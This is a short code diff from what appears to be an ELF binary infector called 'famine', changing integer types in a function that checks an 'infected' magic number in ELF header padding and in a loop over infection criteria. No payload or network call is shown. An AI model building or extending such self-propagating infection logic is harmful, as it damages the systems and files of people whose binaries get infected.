@@ -33,7 +33,7 @@ static inline bool is_linked(const Elf64_Ehdr *header)
 
 static inline bool is_not_infected(const Elf64_Ehdr *header)
 {
-	return *(uint32_t *)((char *)&header->e_ident[EI_PAD]) != INFECTED_MAGIC_NUMBER;
+	return *(unsigned int *)((char *)&header->e_ident[EI_PAD]) != INFECTED_MAGIC_NUMBER;
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -62,7 +62,7 @@ void famine(char *file)
 		return ;
 	}
 
-	for (uint8_t index = 0; index < CRITERIA_SIZE; index++)
+	for (unsigned char index = 0; index < CRITERIA_SIZE; index++)
 	{
 		if (crit[index].fct(header) == false)
 		{
